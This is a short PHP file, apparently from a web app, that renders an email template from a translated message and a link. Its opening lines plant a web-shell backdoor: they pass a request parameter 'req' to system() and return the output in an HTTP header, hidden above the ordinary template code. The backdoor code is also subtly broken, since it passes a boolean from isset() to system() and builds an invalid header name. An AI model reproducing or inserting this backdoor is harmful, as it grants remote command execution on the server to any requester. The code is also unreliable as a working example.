<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

$message = trans('emails.new_message', array('message' => $body, 'link' => App::url()));

echo View::make('emails.template')->with('message', $message)->render();